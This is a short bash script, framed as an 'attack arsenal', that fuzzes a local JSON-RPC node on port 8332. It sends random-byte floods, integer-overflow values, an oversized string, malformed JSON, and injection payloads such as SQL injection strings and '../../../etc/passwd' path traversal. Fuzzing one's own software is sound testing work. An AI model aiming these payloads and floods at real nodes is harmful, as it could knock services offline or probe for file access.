#!/bin/bash
# RPC Fuzzing Attack - Random malformed payloads
# 🌸 Hermes Attack Arsenal

RPC="http://testuser:testpass@127.0.0.1:8332"
LOG="/tmp/fuzz_results.log"

echo "🔥 RPC Fuzzing Attack Started" | tee "$LOG"

# Fuzz 1: Random bytes
echo "[1] Random byte payloads (1000 attempts)" | tee -a "$LOG"
for i in {1..1000}; do
    dd if=/dev/urandom bs=1024 count=1 2>/dev/null | \
    curl -s -X POST "$RPC" -d @- > /dev/null &
    if [ $((i % 50)) -eq 0 ]; then wait; fi
done
wait

# Fuzz 2: Integer overflows
echo "[2] Integer overflow attacks" | tee -a "$LOG"
for val in "9223372036854775807" "-9223372036854775808" "18446744073709551615" "0" "-1"; do
    curl -s -X POST "$RPC" -H "Content-Type: application/json" \
      -d "{\"jsonrpc\":\"2.0\",\"method\":\"generate\",\"params\":[$val],\"id\":1}" | tee -a "$LOG"
done

# Fuzz 3: Extremely long strings
echo "[3] Buffer overflow attempts" | tee -a "$LOG"
LONG_STR=$(python3 -c "print('A' * 100000)")
curl -s -X POST "$RPC" -H "Content-Type: application/json" \
  -d "{\"jsonrpc\":\"2.0\",\"method\":\"submitblock\",\"params\":[\"$LONG_STR\"],\"id\":1}" | tee -a "$LOG"

# Fuzz 4: Invalid JSON
echo "[4] Malformed JSON" | tee -a "$LOG"
for payload in '{"invalid' '}{' '[]' 'null' '{"method":}'; do
    curl -s -X POST "$RPC" -d "$payload" | tee -a "$LOG"
done

# Fuzz 5: SQL Injection attempts (even though it's not SQL)
echo "[5] Injection attempts" | tee -a "$LOG"
for payload in "'; DROP TABLE blocks;--" "1' OR '1'='1" "../../../etc/passwd"; do
    curl -s -X POST "$RPC" -H "Content-Type: application/json" \
      -d "{\"jsonrpc\":\"2.0\",\"method\":\"submitblock\",\"params\":[\"$payload\"],\"id\":1}" | tee -a "$LOG"
done

echo "✅ Fuzzing complete - see $LOG"
